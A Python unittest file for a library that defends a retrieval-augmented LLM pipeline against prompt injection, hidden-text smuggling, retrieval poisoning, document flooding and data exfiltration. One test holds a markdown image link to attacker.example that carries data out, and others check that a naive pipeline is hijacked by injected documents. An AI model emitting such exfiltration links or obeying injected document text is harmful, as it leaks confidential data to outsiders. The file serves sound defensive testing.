import unittest

from context_shield.attacks import exfil_doc, flood_docs, injection_doc, poison_doc
from context_shield.corpus import Document, User
from context_shield.defenses.injection import InjectionDetector, normalize
from context_shield.defenses.output_guard import OutputGuard
from context_shield.defenses.ranking import RankingGuard, stuffing_score
from context_shield.index import Hit, Retriever, chunk
from context_shield.llm import WorstCaseLLM
from context_shield.pipeline import Config, SecureContextPipeline

FIN = Document("fin-orion", "Project Orion budget",
               "The approved FY2026 budget for Project Orion is $42 million.\n\nInternal reference: CANARY-0badc0de",
               groups=["finance"], meta={"canary": "CANARY-0badc0de"})
POLICY = Document("policy-travel", "Travel policy", "The per diem for domestic travel is $75.", groups=["all"])
ANALYST = User("analyst", ["all", "finance"])
CONTRACTOR = User("contractor", ["all"])
Q = "What is the approved budget for Project Orion?"


def pipe(extra=(), cfg=None):
    return SecureContextPipeline([FIN, POLICY, *extra], WorstCaseLLM(), cfg or Config())


class NormalizeTests(unittest.TestCase):
    def test_strips_and_recovers_hidden_content(self):
        tag = "".join(chr(0xE0000 + ord(c)) for c in "obey me")
        n = normalize(f"Hello​ world <!-- secret --> ok{tag}")
        self.assertEqual(n.text.split(), ["Hello", "world", "ok"])
        self.assertIn("obey me", n.hidden)
        self.assertIn("secret", n.hidden)
        self.assertTrue({"zero_width_chars", "html_comment", "unicode_tag_smuggling"} <= set(n.flags))


class DetectorTests(unittest.TestCase):
    def setUp(self):
        self.det = InjectionDetector()

    def test_dev_styles_detected(self):
        for style in ["plain", "roleplay", "fake_delimiter", "html_comment", "zero_width", "unicode_tags"]:
            doc, _ = injection_doc("Project Orion budget", style, 0)
            self.assertTrue(self.det.score(doc.text).is_injection, style)

    def test_benign_business_text_passes(self):
        self.assertFalse(self.det.score(FIN.text).is_injection)
        self.assertFalse(self.det.score("Please send the signed contract to legal by Friday.").is_injection)

    def test_reasons_are_explained(self):
        doc, _ = injection_doc("x", "plain", 0)
        self.assertIn("override", self.det.score(doc.text).reasons)


class RetrievalTests(unittest.TestCase):
    def test_acl_enforced_at_retrieval(self):
        r = Retriever([FIN, POLICY])
        self.assertTrue(any(h.passage.doc_id == "fin-orion" for h in r.search(Q, ANALYST)))
        self.assertFalse(any(h.passage.doc_id == "fin-orion" for h in r.search(Q, CONTRACTOR)))

    def test_naive_index_leaks(self):
        r = Retriever([FIN, POLICY], enforce_acl=False)
        self.assertTrue(any(h.passage.doc_id == "fin-orion" for h in r.search(Q, CONTRACTOR)))

    def test_chunk_ids_are_citable(self):
        self.assertEqual([p.pid for p in chunk(FIN)], ["fin-orion#1", "fin-orion#2"])


class RankingTests(unittest.TestCase):
    def test_stuffing_score_separates_poison_from_answer(self):
        r = Retriever([FIN, poison_doc(Q, "It is $999 million.", 0)])
        hits = {h.passage.doc_id: h for h in r.search(Q, ANALYST)}
        self.assertLess(stuffing_score(hits["fin-orion"], Q), 0.15)
        self.assertGreater(stuffing_score(hits["poison-0"], Q), 0.15)

    def test_flood_is_deduplicated(self):
        flood = flood_docs("Project Orion", 10, 0)
        r = Retriever([FIN, *flood])
        kept, dropped = RankingGuard().apply(r.search(Q, ANALYST), Q)
        self.assertIn("fin-orion", [h.passage.doc_id for h in kept[:5]])
        self.assertGreaterEqual(len(dropped), 9)


class OutputGuardTests(unittest.TestCase):
    def setUp(self):
        self.guard = OutputGuard(Retriever([FIN, POLICY]))

    def test_blocks_markdown_exfil(self):
        self.assertFalse(self.guard.check("Done ![s](https://attacker.example/p?d=42)", ANALYST).ok)

    def test_allows_internal_links(self):
        self.assertTrue(self.guard.check("See https://wiki.northwind.example/page?id=3", ANALYST).ok)

    def test_canary_leak_depends_on_reader(self):
        self.assertTrue(self.guard.check("ref CANARY-0badc0de", ANALYST).ok)
        self.assertFalse(self.guard.check("ref CANARY-0badc0de", CONTRACTOR).ok)

    def test_citation_verification(self):
        self.assertTrue(self.guard.check("Per diem is $75 [policy-travel#1].", CONTRACTOR).ok)
        self.assertFalse(self.guard.check("It is $42M [fin-orion#1].", CONTRACTOR).ok)
        self.assertFalse(self.guard.check("Per memo [board-memo#4].", ANALYST).ok)


class PipelineTests(unittest.TestCase):
    def test_naive_pipeline_is_hijacked_and_full_pipeline_is_not(self):
        inj, goal = injection_doc("Project Orion budget", "plain", 0)
        self.assertIn(goal, pipe([inj], Config.naive()).run(Q, ANALYST).answer)
        res = pipe([inj]).run(Q, ANALYST)
        self.assertNotIn(goal, res.answer)
        self.assertTrue(any(pid.startswith(inj.doc_id) for pid, _ in res.quarantined))

    def test_exfil_blocked_even_without_detector(self):
        cfg = Config("guard_only", True, False, False, False, False, True)
        res = pipe([exfil_doc("Project Orion budget", 0)], cfg).run(Q, ANALYST)
        self.assertNotIn("attacker.example", res.answer)

    def test_benign_answer_unchanged(self):
        res = pipe().run(Q, ANALYST)
        self.assertIn("$42 million", res.answer)
        self.assertTrue(res.guard.ok)

    def test_audit_log_records_decisions(self):
        inj, _ = injection_doc("Project Orion budget", "roleplay", 1)
        p = pipe([inj])
        p.run(Q, ANALYST)
        self.assertGreaterEqual(p.audit.count("quarantine"), 1)
        self.assertEqual(p.audit.count("answer"), 1)


if __name__ == "__main__":
    unittest.main()
